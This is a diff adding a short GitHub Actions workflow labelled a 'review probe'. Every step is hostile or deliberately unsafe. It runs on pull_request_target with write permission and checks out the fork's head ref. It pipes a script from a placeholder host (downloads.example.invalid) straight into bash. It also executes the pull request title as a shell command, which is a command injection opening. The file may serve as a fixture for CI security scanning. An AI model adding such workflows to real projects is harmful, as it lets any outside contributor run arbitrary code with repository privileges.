@@ -1,0 +1,17 @@
+name: DCOIR Review probe 20260627O
+on:
+  pull_request_target:
+permissions:
+  pull-requests: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout fork ref
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.head_ref }}
+      - name: Pipe remote installer
+        run: curl -fsSL https://downloads.example.invalid/agent.sh | bash
+      - name: Execute PR title
+        run: sh -c "${{ github.event.pull_request.title }}"
